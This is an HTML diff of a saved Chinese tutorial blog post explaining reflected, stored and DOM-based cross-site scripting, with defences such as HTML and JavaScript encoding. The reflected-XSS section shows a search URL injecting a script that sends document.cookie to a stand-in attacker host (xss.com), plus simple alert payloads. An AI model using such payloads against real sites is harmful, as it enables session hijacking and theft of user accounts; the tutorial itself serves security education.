@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Title</title>
+</head>
+<body>
+<p>
+  <inherit style="display: block;"><strong><span class="" style="font-size: 15pt !important;">XSS 跨站脚本攻击</span></strong>
+  </inherit>
+  <inherit style="display: block;"><strong><span class="" style="font-size: 15pt !important;"><br></span></strong>
+  </inherit>
+</p>
+<p><span class="" style="color: rgb(89, 88, 86);font-size: 11pt;">跨站脚本攻击（Cross Site Scripting），为了不和层叠样式表（Cascading Style Sheets, CSS）的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者<span
+  style="color: rgb(89, 88, 86);font-size: 11pt;font-weight: 700;">往Web页面里插入恶意Script代码</span></span><span class="">，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</span>
+</p>
+<p>
+  <inherit style="display: block;"><span class="" style="font-size: 12pt !important;">分类</span></inherit>
+</p>
+<ol class="list-paddingleft-2" style="" start="1">
+  <li><p><span class="" style="font-size: 11pt;">Reflected XSS（基于反射的XSS攻击）</span></p></li>
+</ol>
+<ol class="list-paddingleft-2" style="" start="2">
+  <li><p><span class="">Stored XSS（基于存储的XSS攻击）</span></p></li>
+</ol>
+<ol class="list-paddingleft-2" style="" start="3">
+  <li><p><span class="">DOM-based or local XSS（基于DOM或本地的XSS攻击）</span></p></li>
+</ol>
+<p>
+  <inherit style="display: block;"><span class="" style="font-size: 12pt !important;">Reflected XSS（基于反射的XSS攻击）</span>
+  </inherit>
+</p>
+<p><span class="" style="font-size: 11pt;">主要通过利用系统反馈行为漏洞，并欺骗用户主动触发，从而发起Web攻击。</span></p>
+<p><span class="" style="font-size: 11pt;">举个栗子：</span></p>
+<ol class="list-paddingleft-2" style="" start="1">
+  <li><p><span class="" style="font-size: 11pt;">假设，在</span><span class=""
+                                                                  style="color: rgb(0, 118, 122);font-size: 11pt;">严选</span><span
+    class="">网站搜索商品，当搜索不到时站点会做“xxx未上架提示”。如下图。</span></p></li>
+</ol>
+<p>
+  <inherit style="display: block;"><span class=""
+                                         style="display: block;width: 613px;min-height: 60px;border-width: 1px;border-style: solid;border-color: transparent;text-align: inherit;"><img
+    data-src="http://mmbiz.qpic.cn/mmbiz_png/1NOXMW586utubibMzkFia8ibxvguKeGG369yHZPm6wKTia6HjItCDw8mQsTxbMlExLNEXmkwfREGAiaa5RiaVuf61yfw/0?wx_fmt=png"
+    style="border-width: 0px; border-style: initial; border-color: initial; cursor: default; width: 610px !important; height: auto !important; visibility: visible !important;"
+    class="" data-ratio="0.458133971291866" data-w="1672" data-type="png" _width="610px"
+    src="web%E5%AE%89%E5%85%A8%E7%AF%87%E4%B9%8BXSS%20%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB_files/640.jpg"
+    crossorigin="anonymous" alt="图片" data-fail="0"></span></inherit>
+</p>
+<ul class="list-paddingleft-2" style="list-style-type: none;">
+  <li><p><br></p></li>
+</ul>
+<ol class="list-paddingleft-2" style="" start="2">
+  <li><p><span class="" style="font-size: 11pt;">在搜索框搜索内容，填入“&lt;script&gt;alert('xss')&lt;/script&gt;”, 点击搜索。</span>
+  </p></li>
+</ol>
+<ol class="list-paddingleft-2" style="" start="3">
+  <li><p><span class="">当前端页面没有对填入的数据进行过滤，直接显示在页面上， 这时就会alert那个字符串出来。</span></p></li>
+</ol>
+<p>
+  <inherit style="display: block;"><span class=""
+                                         style="display: block;width: 613px;min-height: 60px;border-width: 1px;border-style: solid;border-color: transparent;text-align: inherit;"><img
+    src="web安全篇之XSS%20跨站脚本攻击_files/6401.webp"></span></inherit>
+</p>
+<ul class="list-paddingleft-2" style="list-style-type: none;">
+  <li><p><br></p></li>
+</ul>
+<p><span class="" style="font-size: 11pt;">（当然上图是模拟的）</span></p>
+<p><span class="" style="font-size: 11pt;">以上3步只是“自娱自乐”，XSS最关键的是第四步。</span></p>
+<ol class="list-paddingleft-2" style="" start="1">
+  <li><p><span class="" style="font-size: 11pt;">进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址：</span></p></li>
+</ol>
+<ol class="list-paddingleft-2" style="" start="1">
+  <li><p><span class="">http://you.163.com/search?keyword=</span><span class=""
+                                                                       style="color: rgb(71, 82, 93) !important;">&lt;script</span><span
+    class="">&gt;</span><span class="" style="color: rgb(71, 82, 93) !important;">document</span><span class="">.location=</span><span
+    class="" style="color: rgb(71, 82, 93) !important;">'http://xss.com/get?cookie='</span><span class="">+</span><span
+    class="" style="color: rgb(71, 82, 93) !important;">document</span><span class="">.cookie</span><span class=""
+                                                                                                          style="color: rgb(71, 82, 93) !important;">&lt;/script</span><span
+    class="">&gt;</span></p></li>
+</ol>
+<ol class="list-paddingleft-2" style="">
+  <li><p><span class="" style="font-size: 11pt;">如果受骗的用户刚好已经登录过严选网站，那么，用户的登录cookie信息就已经发到了攻击者的服务器（<span
+    style="font-size: 11pt;"><em>xss.com</em></span></span><span class="">）了。当然，攻击者会做一些更过分的操作。</span></p></li>
+</ol>
+<p>
+  <inherit style="display: block;"><span class="" style="font-size: 12pt !important;">Stored XSS（基于存储的XSS攻击）</span>
+  </inherit>
+</p>
+<p><span class="" style="font-size: 11pt;">Stored XSS和Reflected XSS的差别就在于，具有攻击性的脚本被保存到了服务器并且可以被普通用户完整的从服务的取得并执行，从而获得了在网络上传播的能力。</span>
+</p>
+<p><span class="" style="font-size: 11pt;">再举个栗子：</span></p>
+<ol class="list-paddingleft-2" style="" start="1">
+  <li><p><span class="" style="font-size: 11pt;">发一篇文章，里面包含了恶意脚本</span></p></li>
+</ol>
+<ol class="list-paddingleft-2" style="">
+  <li><p><span class="">你好！当你看到这段文字时，你的信息已经不安全了！</span><span class="" style="color: rgb(71, 82, 93) !important;">&lt;script</span><span
+    class="">&gt;alert(</span><span class="" style="color: rgb(71, 82, 93) !important;">'xss'</span><span
+    class="">)</span><span class="" style="color: rgb(71, 82, 93) !important;">&lt;/script</span><span
+    class="">&gt;</span></p></li>
+</ol>
+<ol class="list-paddingleft-2" style="">
+  <li><p><span class="" style="font-size: 11pt;">后端没有对文章进行过滤，直接保存文章内容到数据库。</span></p></li>
+</ol>
+<ol class="list-paddingleft-2" style="">
+  <li><p><span class="">当其他读者看这篇文章的时候，包含的恶意脚本就会执行。</span></p></li>
+</ol>
+<p><span class="" style="color: rgb(89, 88, 86);font-size: 11pt;">tips：文章是保存整个HTML内容的，前端显示时候也不做过滤，就极可能出现这种情况。</span></p>
+<p><span class="" style="color: rgb(89, 88, 86);font-size: 11pt;">此为题多从在于博客网站。</span></p>
+<p><span class=""
+         style="font-size: 11pt;">如果我们的操作不仅仅是弹出一个信息，而且删除一篇文章，发一篇反动的文章，或者成为我的粉丝并且将这篇带有恶意脚本的文章转发，这样是不是就具有了攻击性。</span></p>
+<p>
+  <inherit style="display: block;"><span class="" style="font-size: 12pt !important;">DOM-based or local XSS（基于DOM或本地的XSS攻击）</span>
+  </inherit>
+</p>
+<p><span class=""
+         style="font-size: 11pt;">DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。</span></p>
+<p><span class="" style="font-size: 11pt;">DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</span>
+</p>
+<p><span style="font-size: 20px;"><br></span></p>
+<p><span style="font-weight: 700;font-size: 20px;">可能触发DOM型XSS的属性：</span></p>
+<p><span class="">document.referer属性</span></p>
+<p><span class="">window.name属性</span></p>
+<p><span class="">location属性</span></p>
+<p><span class="">innerHTML属性</span></p>
+<p><span class="">documen.write属性</span></p>
+<p><span class="">······</span></p>
+<p><span class=""><br></span></p>
+<p>
+  <inherit style="display: block;"><span style="font-size: 20px;"><strong>总结</strong></span></inherit>
+  <inherit style="display: block;"><span style="font-size: 12pt !important;"><br></span></inherit>
+</p>
+<p><span class="" style="font-size: 11pt;">XSS攻击的本质就是，利用一切手段在目标用户的浏览器中执行攻击脚本。</span></p>
+<p>
+  <inherit style="display: block;"><span class="" style="font-size: 12pt !important;">防范</span></inherit>
+</p>
+<p><span class="" style="font-size: 11pt;">对于一切用户的输入、输出、客户端的输出内容视为不可信，在数据添加到DOM或者执行了DOM API的时候，我们需要对内容进行HtmlEncode或JavaScriptEncode，以预防XSS攻击。</span>
+</p>
+<p><span class="" style="font-size: 11pt;">具体实施，请参考</span><span class=""
+                                                                style="color: rgb(0, 118, 122);font-size: 11pt;">此篇博文http://www.cnblogs.com/lovesong/p/5211667.html</span>
+</p>
+<p><span class="" style="font-size: 11pt;color: rgb(0, 118, 122);"><br></span></p>
+<p><br></p>
+<blockquote
+  style="box-sizing: border-box;padding: 10px 20px;margin-top: 1.5em;margin-bottom: 1.5em;font-size: 14px;border-left-width: 2px;border-left-color: rgb(0, 154, 97);background: rgb(246, 246, 246);color: rgb(85, 85, 85);">
+  <p style="box-sizing: border-box;">作者:&nbsp;<span style="color: rgb(153, 153, 153);">&nbsp;</span><strong
+    style="box-sizing: border-box;">zwwill</strong></p>
+  <p style="box-sizing: border-box;">链接: https://segmentfault.com/a/1190000011303483</p></blockquote>
+<p><br></p>
+<p><br></p>
+</body>
+</html>
